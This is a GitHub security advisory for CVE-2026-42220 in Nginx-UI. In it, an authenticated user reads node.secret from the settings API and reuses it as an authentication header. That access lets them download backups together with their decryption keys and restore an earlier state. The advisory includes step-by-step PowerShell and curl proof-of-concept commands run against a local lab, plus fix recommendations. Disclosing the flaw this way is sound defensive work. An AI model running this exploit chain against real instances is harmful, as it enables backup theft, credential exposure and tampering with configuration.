# [M] Nginx-UI: Authenticated settings disclosure exposes node.secret and enables trusted-node authentication abuse, backup exfiltration, and restore-based nginx-ui state rollback

## Summary
Severity: Medium
Advisory: GHSA-7jrr-xw9c-mj39
CVE: CVE-2026-42220
CWE: CWE-200, CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-7jrr-xw9c-mj39
Type: github-advisory

## Affected
- Go: `github.com/0xJacky/Nginx-UI` — affected >=0

## Details
## Summary
An authenticated user can call `GET /api/settings` and retrieve sensitive configuration values, including `node.secret`. The same `node.secret` is accepted by `AuthRequired()` through the `X-Node-Secret` header (or `node_secret` query parameter), causing the request to be treated as authenticated via the trusted-node path and associated with the init user.
In my local reproduction on `v2.3.6`, `GET /api/settings` also returned `app.jwt_secret`. After extracting `node.secret`, I was able to access `GET /api/backup` using only `X-Node-Secret`, download a full backup archive, and obtain the `X-Backup-Security` response header containing the backup decryption material (`AESKey:AESIv`).
I also confirmed that the disclosed `node.secret` is sufficient to reach the restore workflow on an installed instance. Using only `X-Node-Secret`, a valid backup archive, and its matching `X-Backup-Security` token, I successfully invoked `POST /api/restore`. In a follow-up rollback test, I changed `node.name` to `rollback-poc-B`, then restored a previously captured backup and observed the value revert to its original state. This extends the issue beyond secret disclosure and backup exfiltration into confirmed integrity impact through restore-based rollback of nginx-ui state/configuration.
This breaks the trust boundary between ordinary user-authenticated API access and the internal node-authentication mechanism, and results in sensitive configuration disclosure, alternate-authentication abuse, backup exfiltration with decryption material, and confirmed restore-based rollback of nginx-ui state.

## Details
### Vulnerable code / related files and functions

**1) Route exposure and insufficient protection on the read path**

File: `api/settings/router.go`

Relevant function: `InitRouter`

The settings router exposes the following endpoints:
```http
GET /api/settings/server/name → GetServerName
GET /api/settings → GetSettings
POST /api/settings → RequireSecureSession(), SaveSettings
```

The key issue is that the read path (GET /api/settings) is only protected by the generic authentication middleware, while the write path (POST /api/settings) has an additional RequireSecureSession() check. This makes the read path a much easier place to leak sensitive configuration data than the write path.
```go
r.GET("settings/server/name", GetServerName)
r.GET("settings", GetSettings)
r.POST("settings", middleware.RequireSecureSession(), SaveSettings)
```

**2) Sensitive data is disclosed by GetSettings**

File: `api/settings/settings.go`

Relevant functions: GetSettings, SaveSettings

`GetSettings` returns multiple configuration objects directly in the JSON response, including app, server, database, auth, casdoor, oidc, cert, http, logrotate, nginx, node, openai, terminal, and webauthn. In other words, the handler does not use a redacted DTO for user-facing output; it serializes the live settings objects directly.

```go
c.JSON(http.StatusOK, gin.H{
  "app":       cSettings.AppSettings,
  "server":    cSettings.ServerSettings,
  "database":  settings.DatabaseSettings,
  "auth":      settings.AuthSettings,
  "casdoor":   settings.CasdoorSettings,
  "oidc":      settings.OIDCSettings,
  "cert":      settings.CertSettings,
  "http":      settings.HTTPSettings,
  "logrotate": settings.LogrotateSettings,
  "nginx":     settings.NginxSettings,
  "node":      settings.NodeSettings,
  "openai":    settings.OpenAISettings,
  "terminal":  settings.TerminalSettings,
  "webauthn":  settings.WebAuthnSettings,
})
```

In my local reproduction on v2.3.6, this response exposed both:
```
node.secret
app.jwt_secret
```

This makes GetSettings the direct disclosure source for the vulnerability.

**3) The disclosed value is explicitly defined as protected/sensitive**

File: `settings/node.go`

Relevant object: type Node

The Node settings object defines the following field:
```go
type Node struct {
    Name   string `json:"name" binding:"omitempty,safety_text"`
    Secret string `json:"secret" protected:"true"`
    ...
}
```

The `protected:"true"` tag shows that the codebase itself treats `node.secret` as a protected/sensitive value. Despite that, the field is still returned unredacted by `GetSettings`. This strongly indicates a real secret disclosure issue rather than a harmless configuration read.

**4) The disclosed secret is reused as an authentication credential**

File: `internal/middleware/middleware.go`

Relevant functions: getNodeSecret, AuthRequired, AuthRequiredWS

The authentication middleware contains a separate node-secret authentication path:

- `getNodeSecret(c)` reads the value from the `X-Node-Secret` header or the `node_secret` query parameter.
- AuthRequired() checks whether the supplied value equals settings.NodeSettings.Secret.
- If it matches, the middleware:
        loads initUser := user.GetInitUser(c)
        stores Secret in the context
        stores user in the context
- allows the request to proceed without relying on the ordinary JWT path for that identity flow

This is the sink of the vulnerability: the same secret disclosed by GET /api/settings is accepted as a valid authentication credential by the middleware.

```go
if nodeSecret := getNodeSecret(c); nodeSecret != "" && nodeSecret == settings.NodeSettings.Secret {
    initUser := user.GetInitUser(c)
    c.Set("Secret", nodeSecret)
    c.Set("user", initUser)
    c.Next()
    return
}
```

AuthRequiredWS() contains similar logic for the WebSocket path, meaning the same secret is also trusted by the WebSocket authentication flow.

**5) The write path already treats these fields as protected, but the read path does not**

File: `api/settings/settings.go`

Relevant function: SaveSettings

`SaveSettings()` already uses ProtectedFill(...) for several settings objects, including:
```
AppSettings
NodeSettings
OpenAISettings
NginxSettings
OIDCSettings
```

This shows the project already recognizes that these objects contain protected fields on the write path. However, GetSettings() still returns the raw objects on the read path, creating a clear “write-protected but read-exposed” inconsistency. That inconsistency is the core authorization/secret-handling flaw here.
```go
cSettings.ProtectedFill(cSettings.AppSettings, &json.App)
cSettings.ProtectedFill(settings.NodeSettings, &json.Node)
cSettings.ProtectedFill(settings.OpenAISettings, &json.Openai)
cSettings.ProtectedFill(settings.NginxSettings, &json.Nginx)
cSettings.ProtectedFill(settings.OIDCSettings, &json.Oidc)
```

**6) Backup endpoint reachable after alternate authentication**

File: `api/backup/router.go`, `api/backup/backup.go`

Relevant functions: `InitRouter`, `CreateBackup`

The backup route is exposed as:

```go
r.GET("backup", CreateBackup)
```

This route is protected by the same AuthRequired() middleware chain as other authenticated API routes.

In `CreateBackup()`, the server returns the backup archive to the caller and also sets the X-Backup-Security response header containing the decryption material:
```go
c.Header("X-Backup-Security", fmt.Sprintf("%s:%s", backup.Security.AESKey, backup.Security.AESIv))
c.File(backupFilePath)
```

As a result, once node.secret is disclosed from /api/settings and reused through X-Node-Secret, the attacker can access /api/backup and obtain both the encrypted backup and the decryption token in the same response.

This means the disclosed secret is not only usable for low-risk authenticated reads, but also for high-impact data exfiltration through the backup subsystem.

**7) Restore endpoint is reachable and usable after alternate authentication**

File: `api/backup/router.go`, `api/backup/restore.go`, `internal/backup/restore.go`

Relevant functions: `authIfInstalled`, `RestoreBackup`, internal restore helpers

The restore route is exposed as:

```go
r.POST("/restore", authIfInstalled, middleware.EncryptedForm(), RestoreBackup)
```

On installed instances, authIfInstalled calls AuthRequired(). Because AuthRequired() accepts X-Node-Secret and associates the request with the init user, the same disclosed node.secret can be used to reach the restore workflow, not just read-only or backup routes.

RestoreBackup() accepts:

- backup_file
- security_token
- restore_nginx
- restore_nginx_ui
- verify_hash

It parses the security_token as AESKey:AESIv, decodes both values from base64, saves the uploaded backup archive to a temporary location, and then calls the internal restore logic.

In my local reproduction on v2.3.6, a request to POST /api/restore using only:

- X-Node-Secret
- a valid backup archive
- the matching X-Backup-Security token

returned:

```
{"nginx_ui_restored":false,"nginx_restored":false,"hash_match":true}
```

for a no-op restore test, confirming that the restore path was reachable and processed successfully via the trusted-node authentication path.

I then performed an observable rollback test. After changing node.name to rollback-poc-B, I restored a previously captured backup using only X-Node-Secret plus the matching backup/security token pair. The server returned:

```
{"nginx_ui_restored":true,"nginx_restored":false,"hash_match":true}
```

and GET /api/settings/server/name changed from:

```
rollback-poc-B
```

back to its original empty value after the restore completed.

This confirms that the disclosed node.secret is sufficient not only for backup exfiltration, but also for successful restore invocation and rollback of nginx-ui state/configuration.

**Why these files together form the vulnerability**

These files combine into a single exploitable chain:

- `api/settings/router.go` exposes the settings read endpoint to authenticated callers.
- `api/settings/settings.go:GetSettings` returns raw settings objects, disclosing node.secret and other sensitive values.
- `settings/node.go` confirms that node.secret is explicitly treated as a protected field.
- `internal/middleware/middleware.go:AuthRequired` accepts that same secret as a valid alternate authentication factor and associates the request with the init user.

For that reason, this is not just a “settings disclosure” issue. It is more accurately described as:

```
secret disclosure in a user-facing API combined with reuse of the disclosed secret as an authentication factor in middleware.
```

### Vulnerable source-to-sink path

The vulnerable chain spans the settings API, node authentication middleware, backup subsystem, and restore subsystem.

**Source**

An authenticated caller can reach:

- `GET /api/settings`

The handler returns raw settings objects directly in the JSON response, including:

- `settings.NodeSettings`
- `cSettings.AppSettings`
- `settings.OpenAISettings`
- other configuration objects

In my local reproduction on `v2.3.6`, the response exposed:

- `node.secret`
- `app.jwt_secret`

**Propagation**

The attacker extracts `node.secret` from the `/api/settings` response and reuses it as:

- `X-Node-Secret` header`, or
- `node_secret` query parameter`

**Authentication sink**

`AuthRequired()` in `internal/middleware/middleware.go` checks whether the supplied node secret matches `settings.NodeSettings.Secret`. If it matches, the middleware loads `initUser := user.GetInitUser(c)`, stores the user in the request context, and allows the request to proceed without using the ordinary JWT path for that identity flow.

**Post-authentication sinks**

After satisfying `AuthRequired()` through `X-Node-Secret`, the attacker can reach additional protected routes, including:

- `GET /api/settings/server/name`
- `GET /api/settings`
- `GET /api/backup`
- `POST /api/restore` (on installed instances via `authIfInstalled` → `AuthRequired()`)`

In particular:

- `GET /api/backup` returns the backup archive and sets the `X-Backup-Security` response header containing the decryption material (`AESKey:AESIv`)`
- `POST /api/restore` accepts a backup archive plus the matching `security_token` and executes the restore workflow

This creates the following end-to-end source-to-sink chain:

1. Authenticated caller reaches `GET /api/settings`
2. Response discloses `node.secret` (and in my lab also `app.jwt_secret`)
3. Attacker reuses `node.secret` as `X-Node-Secret`
4. `AuthRequired()` accepts the request on the trusted-node path and associates it with the init user
5. Attacker accesses `GET /api/backup`
6. Server returns the encrypted backup archive and `X-Backup-Security` decryption material in the same response
7. Attacker submits the captured backup and matching token to `POST /api/restore` using only `X-Node-Secret`
8. Server processes the restore request successfully
9. nginx-ui state/configuration can be rolled back to the contents of the captured backup

This is not just a read-only disclosure chain. It is a disclosure-to-authentication-to-backup-to-restore chain with confirmed integrity impact.

### Why this is a vulnerability, not intended behavior

This is not expected behavior for three reasons:

1. `Node.Secret` is explicitly marked `protected:"true"`, indicating it is sensitive.
2. `SaveSettings()` uses `ProtectedFill(...)` on NodeSettings, OpenAISettings, and other settings objects, showing the write path already treats these fields as protected/special.
3. Despite that, GetSettings() still returns the raw secret-bearing objects to the caller, and the disclosed node.secret is immediately reusable as an authentication credential in middleware. That breaks the intended separation between user-facing configuration APIs and internal trusted-node authentication.

### Trust boundary that is broken

The broken boundary is:
```
ordinary authenticated user/API session → trusted node / init-user authentication path
```

A caller who is only supposed to use the normal JWT/cookie-based user path can retrieve a secret that belongs to the trusted-node path, then cross that boundary by presenting `X-Node-Secret` to `AuthRequired()`.

### Attacker model / required privileges

The confirmed attacker requirement is:

- ability to authenticate to the web UI and call GET /api/settings

In my local reproduction on v2.3.6, I reproduced this with a normal browser-authenticated session after resetting the initial account password in a fresh Docker deployment. The issue does not require shell access or direct database access. The route itself is protected, but the read-path has no additional redaction for secret-bearing settings, and the disclosed node secret can then be reused as alternate authentication.

### Additional confirmed impact: backup exfiltration through the trusted-node authentication path

The impact is not limited to reading settings or downloading backups.

In `api/backup/router.go`, the restore endpoint is exposed as:

```go
r.POST("/restore", authIfInstalled, middleware.EncryptedForm(), RestoreBackup)
```

On installed instances, authIfInstalled calls AuthRequired(). Because AuthRequired() accepts X-Node-Secret and maps the request to the init user when the supplied secret matches settings.NodeSettings.Secret, the disclosed node.secret can also be reused to reach the restore workflow.

In api/backup/restore.go, RestoreBackup() accepts:

- backup_file
- security_token
- restore_nginx
- restore_nginx_ui
- verify_hash

It parses security_token as AESKey:AESIv, decodes both values from base64, saves the uploaded backup archive, and invokes the internal restore logic.

In my local reproduction on v2.3.6, I first confirmed route reachability by submitting a valid backup archive and matching security_token using only X-Node-Secret, which returned:
```
{"nginx_ui_restored":false,"nginx_restored":false,"hash_match":true}
```

I then performed an observable rollback test:

1. Captured a valid backup in state A
2. Changed node.name to rollback-poc-B
3. Verified GET /api/settings/server/name returned rollback-poc-B
4. Submitted the previously captured backup to POST /api/restore using only X-Node-Secret and the matching security_token
Received:
```
{"nginx_ui_restored":true,"nginx_restored":false,"hash_match":true}
```

Verified GET /api/settings/server/name returned the original empty value after restore

This confirms that the disclosed node.secret is sufficient not only for backup exfiltration, but also for successful restore invocation and rollback of nginx-ui state/configuration through the trusted-node authentication path.

## PoC
### Reproduction environment

- Product: 0xJacky/nginx-ui
- Confirmed version: v2.3.6
- Deployment method: local Docker lab on http://127.0.0.1:8080 using uozi/nginx-ui:latest at the time of testing.

### Exact reproduction steps
1.Start a fresh local Docker deployment of uozi/nginx-ui:latest.

Optional convenience settings I used in the lab:
```powershell
NGINX_UI_NODE_SKIP_INSTALLATION=true
NGINX_UI_NODE_SECRET=<known test value>
NGINX_UI_APP_JWT_SECRET=<known test value>
NGINX_UI_IGNORE_DOCKER_SOCKET=true
```

These are documented environment settings supported by Nginx UI.

2.Reset the initial account password using the official command:
```powershell
docker exec nginx-ui-lab nginx-ui reset-password --config=/etc/nginx-ui/app.ini
```

The application prints the username/password for the initial account.
[Screenshot 1: password reset output showing the initial username/password]
<img width="1919" height="274" alt="image" src="https://github.com/user-attachments/assets/ec37a0f1-8de5-42dd-beee-c6ddac458ab8" />

3.Log in through the browser and capture the JWT token from the login response or the token cookie.
[Screenshot 2: browser/devtools showing authenticated session and token]
<img width="1535" height="746" alt="image" src="https://github.com/user-attachments/assets/012b65a4-fa51-44a2-a8d0-bcb6a733cffa" />

4.Send:
```http
GET /api/settings
Header: Authorization: <raw JWT>
```

In my reproduction, the response contained:

- `node.secret`
- `app.jwt_secret`
- other settings objects such as openai, oidc, casdoor, nginx, etc.

Example PowerShell:
```powershell
$Base = "http://127.0.0.1:8080"
$Jwt  = "<captured token>"
$authHeaders = @{ Authorization = $Jwt }
$settings = Invoke-RestMethod -Method Get -Uri "$Base/api/settings" -Headers $authHeaders
$nodeSecret = $settings.node.secret
$settings | ConvertTo-Json -Depth 20
```

[Screenshot 3: /api/settings response showing node.secret and app.jwt_secret]
<img width="1706" height="978" alt="image" src="https://github.com/user-attachments/assets/25fc3c94-e5b3-4309-8b49-09633fbe3b89" />

<img width="948" height="104" alt="image" src="https://github.com/user-attachments/assets/eca687a5-1e02-42a1-b196-155184db4226" />


5.Verify that the protected route fails without authentication:
```powershell
Invoke-RestMethod -Method Get -Uri "$Base/api/settings/server/name"
```

Expected result: `403 Forbidden.`

[Screenshot 4: unauthenticated 403]
<img width="1261" height="236" alt="image" src="https://github.com/user-attachments/assets/ba302b53-e4f7-414a-9a95-ea2b64a5e05a" />

6.Re-send the same request with only `X-Node-Secret`:
```powershell
$nodeHeaders = @{ "X-Node-Secret" = $nodeSecret }
Invoke-RestMethod -Method Get -Uri "$Base/api/settings/server/name" -Headers $nodeHeaders
```

Expected result: 200 OK with a JSON body such as:

{ "name": "" }

[Screenshot 5: successful response using only X-Node-Secret]
<img width="1833" height="96" alt="image" src="https://github.com/user-attachments/assets/eef06152-2450-4701-9b06-6997d7ce24f5" />

7.Re-send `GET /api/settings` using only `X-Node-Secret`:
```powershell
$settingsViaSecret = Invoke-RestMethod -Method Get -Uri "$Base/api/settings" -Headers $nodeHeaders
$settingsViaSecret | ConvertTo-Json -Depth 20
```

Expected result: 200 OK, and the response again includes node.secret.

[Screenshot 6: /api/settings succeeding with only X-Node-Secret]
<img width="1708" height="835" alt="image" src="https://github.com/user-attachments/assets/7401ba0e-fb7e-4de8-970a-39f8077c0748" />


8.Use the disclosed `node.secret` to access the backup endpoint:

```powershell
$Base = "http://127.0.0.1:8080"
$nodeHeaders = @{ "X-Node-Secret" = $nodeSecret }

$r = Invoke-WebRequest -UseBasicParsing -Method Get -Uri "$Base/api/backup" -Headers $nodeHeaders -OutFile ".\nginxui-backup.zip" -PassThru
$r.StatusCode
$r.Headers["X-Backup-Security"]
$r.Headers | Format-List
```

Expected result:

- HTTP status 200 OK
- a backup archive is written to disk
- the response contains the X-Backup-Security header with backup decryption material in the format: `AESKey:AESIv`

[Screenshot 7: successful /api/backup download using only X-Node-Secret]
<img width="1919" height="823" alt="image" src="https://github.com/user-attachments/assets/f76b8e5d-651b-47e0-a08c-7e2dfc6d4a00" />

9.(Optional validation) Verify that the issue is not dependent on JWT forgery.

I also tested whether the disclosed app.jwt_secret could be used to forge a valid JWT for standard authenticated routes. I generated a forged HS256 JWT using the leaked signing secret and attempted to access protected endpoints with the forged token.

Example PowerShell:
```powershell
$forgedHeaders = @{ Authorization = $ForgedJwt }

Invoke-RestMethod -Method Get -Uri "$Base/api/settings/server/name" -Headers $forgedHeaders
Invoke-RestMethod -Method Get -Uri "$Base/api/settings" -Headers $forgedHeaders
Invoke-WebRequest -UseBasicParsing -Method Get -Uri "$Base/api/backup" -Headers $forgedHeaders -OutFile ".\forged-jwt-backup.zip" -PassThru
```

Observed result:

- forged JWT access to /api/settings/server/name returned 403
- forged JWT access to /api/settings returned 403
- forged JWT access to /api/backup returned 403

This suggests the standard JWT path is additionally constrained by server-side token lookup and that the confirmed exploitation path is specifically the disclosed node.secret / X-Node-Secret alternate authentication route.

[Screenshot : forged JWT requests returning 403]

<img width="1907" height="967" alt="image" src="https://github.com/user-attachments/assets/c62a074b-bd35-436a-b1b1-6f2c3bff34d2" />


10.Confirm observable rollback of nginx-ui state using a previously captured backup.

First, I captured a backup in state A:
```powershell
$rA = Invoke-WebRequest -UseBasicParsing -Method Get -Uri "$Base/api/backup" -Headers $nodeHeaders -OutFile ".\backup-state-A.zip" -PassThru
$SecurityTokenA = ($rA.Headers["X-Backup-Security"] | Select-Object -First 1).ToString().Trim()
```

I then changed node.name through the normal authenticated settings write path to:
```
rollback-poc-B
```

and verified:
```
Invoke-RestMethod -Method Get -Uri "$Base/api/settings/server/name" -Headers $nodeHeaders
```

Observed result:
```
name
----
rollback-poc-B
```

I then restored the previously captured state-A backup using only X-Node-Secret and the matching backup/security token:
```powershell
curl.exe -i -X POST "$Base/api/restore" `
  -H "X-Node-Secret: $nodeSecret" `
  -F "backup_file=@.\backup-state-A.zip" `
  --form-string "security_token=$SecurityTokenA" `
  --form-string "restore_nginx=false" `
  --form-string "restore_nginx_ui=true" `
  --form-string "verify_hash=true"
```

Observed result:
```powershell
{"nginx_ui_restored":true,"nginx_restored":false,"hash_match":true}
```

After waiting a few seconds for the restore to apply, I queried the same setting again:
```powershell
Invoke-RestMethod -Method Get -Uri "$Base/api/settings/server/name" -Headers $nodeHeaders
```

Observed result:
```
name
----
```

This confirmed successful rollback of nginx-ui state/configuration from rollback-poc-B back to the original value using only the disclosed node.secret, a valid backup archive, and the matching X-Backup-Security token.

[Screenshot: node.name / server name before restore showing rollback-poc-B]
<img width="1517" height="175" alt="image" src="https://github.com/user-attachments/assets/e358a217-3089-45a1-9e66-87f78958a347" />

[Screenshot: successful restore response showing nginx_ui_restored:true]
<img width="1671" height="423" alt="image" src="https://github.com/user-attachments/assets/5051b4c1-0ad7-4186-8158-fb7da593efef" />

[Screenshot: same setting after restore showing rollback to the original value]
<img width="1707" height="319" alt="image" src="https://github.com/user-attachments/assets/eb9b5707-d90a-430e-92f9-6619ddf7f9cd" />

### Confirmed observed results

In my local reproduction on `v2.3.6`:

- `GET /api/settings` with a normal authenticated session returned:
  - `node.secret = NodeSecret-Lab-123456`
  - `app.jwt_secret = JwtSecret-Lab-123456`

- `GET /api/settings/server/name` without authentication returned `403`

- `GET /api/settings/server/name` with only `X-Node-Secret: NodeSecret-Lab-123456` returned `200`

- `GET /api/settings` with only `X-Node-Secret` returned `200`

- `GET /api/backup` with only `X-Node-Secret` returned `200`

- `/api/backup` returned both:
  - a backup archive
  - the `X-Backup-Security` response header containing backup decryption material

- `POST /api/restore` without authentication failed with:
```json
{"message":"Authorization failed"}
```

POST /api/restore with only X-Node-Secret, a valid backup archive, and the matching X-Backup-Security token returned:
```
{"nginx_ui_restored":false,"nginx_restored":false,"hash_match":true}
```
after changing node.name to rollback-poc-B, GET /api/settings/server/name returned:
```
rollback-poc-B
```
restoring a previously captured backup using only X-Node-Secret and the matching X-Backup-Security token returned:
```
{"nginx_ui_restored":true,"nginx_restored":false,"hash_match":true}
```
after restore, GET /api/settings/server/name returned the original empty value, confirming rollback of nginx-ui state/configuration
forged JWT requests signed with the leaked app.jwt_secret failed with 403 on the tested standard protected routes

## Impact
The confirmed impact is:

1. **Sensitive settings disclosure**  
   An authenticated caller can retrieve sensitive configuration values through `GET /api/settings`, including:
   - `node.secret`
   - `app.jwt_secret`
   - other secret-bearing settings objects depending on deployment and enabled integrations

2. **Alternate-authentication abuse**  
   The disclosed `node.secret` can be reused through `X-Node-Secret` (or `node_secret`) to satisfy `AuthRequired()` and enter the trusted-node / init-user authentication path.

3. **Trust-boundary bypass**  
   An ordinary authenticated user can cross from the normal JWT/cookie-based user path into the internal node-authentication path.

4. **Full backup exfiltration**  
   After crossing that boundary, the attacker can access `GET /api/backup` and download the application's backup archive.

5. **Backup decryption material disclosure**  
   The same `/api/backup` response also includes the `X-Backup-Security` header containing the decryption material (`AESKey:AESIv`), allowing the attacker to decrypt the exported backup contents.

6. **Restore workflow invocation through the trusted-node path**  
   The disclosed `node.secret` is sufficient to reach `POST /api/restore` on an installed instance when combined with a valid backup archive and matching `X-Backup-Security` token.

7. **Confirmed rollback of nginx-ui state/configuration**  
   In my lab, I changed `node.name` to `rollback-poc-B`, then restored a previously captured backup using only `X-Node-Secret` and the matching backup/security token pair. After restore, the value reverted to its original state. This confirms real integrity impact through rollback of nginx-ui state/configuration.

8. **Potential service disruption / operational impact**  
   Because restore operations can trigger nginx-ui and/or nginx restart behavior depending on the selected restore options, abuse of the restore workflow may also create operational disruption in addition to confidentiality and integrity impact.

9. **Potential downstream compromise**  
   Depending on deployment and configured integrations, the exposed settings and exported backups may contain additional sensitive information such as:
   - JWT signing secrets
   - node secrets
   - third-party API credentials
   - OIDC / Casdoor / OpenAI configuration
   - operational configuration data and other stored secrets

### Notes on JWT forgery testing

I also tested whether the disclosed `app.jwt_secret` could be used for successful forged JWT access on standard authenticated routes. In my reproduction, forged HS256 JWTs signed with the leaked secret were rejected with `403` on `/api/settings/server/name`, `/api/settings`, and `/api/backup`.

This indicates that the **confirmed exploitation path** is the disclosed `node.secret` and the `X-Node-Secret` trusted-node authentication route, not direct JWT forgery on standard routes.

This matters because the confirmed impact already includes:
- backup exfiltration
- disclosure of backup decryption material
- successful restore invocation
- rollback of nginx-ui state/configuration

without needing forged JWTs.

## Recommended fix
1. **Do not return secret-bearing settings fields from `GET /api/settings`.**  
   Replace the current raw response with a redacted DTO. At minimum, do not expose:
   - `node.secret`
   - `app.jwt_secret`
   - provider / API / client secrets
   - any other secret-bearing settings fields

2. **Require stronger authorization for settings read operations.**  
   If `/api/settings` is intended only for trusted administrators or internal operators, enforce that explicitly instead of relying only on the generic authenticated middleware.

3. **Do not use a secret retrievable from a user-facing API as an authentication credential.**  
   The node secret should be scoped strictly to node-to-node communication and must never be readable through ordinary user-facing settings APIs.

4. **Reassess use of `X-Node-Secret` as a full alternate-authentication mechanism.**  
   If this mechanism must exist, it should be isolated from user-facing routes and should not map directly to privileged request context without additional scoping or separation.

5. **Protect backup functionality against alternate-authentication abuse.**  
   `/api/backup` should not be reachable through a secret that can be disclosed via `/api/settings`.

6. **Protect restore functionality against trusted-node secret abuse.**  
   On installed instances, `/api/restore` should not be invocable through a node secret disclosed from a user-facing API. Restore should require a stronger admin-only authorization model and should not be reachable through the same alternate-authentication path used for node trust.

7. **Do not return backup decryption material in the same response as the backup file.**  
   The current `X-Backup-Security` header exposes decryption material together with the encrypted archive, which defeats the security goal of backup encryption when the endpoint is reached by an unauthorized actor.

8. **Consider requiring explicit re-authentication / secure-session semantics for restore.**  
   Restore is a high-impact state-changing action and should be protected at least as strongly as other sensitive write operations.

9. **Rotate compromised secrets on upgrade/fix.**  
   After patching, rotate:
   - node secret
   - JWT signing secret
   - backup encryption material
   - any third-party credentials or secrets exposed through `/api/settings` or backup exports

10. **Audit all settings objects returned by `GetSettings()` for secret leakage.**  
   The current response includes multiple settings objects (`app`, `node`, `openai`, `oidc`, `casdoor`, etc.), so the remediation should be systematic rather than field-by-field only.

A patch is available at https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.8.

## References
- https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-7jrr-xw9c-mj39
- https://nvd.nist.gov/vuln/detail/CVE-2026-42220
- https://github.com/0xJacky/nginx-ui
- https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.8
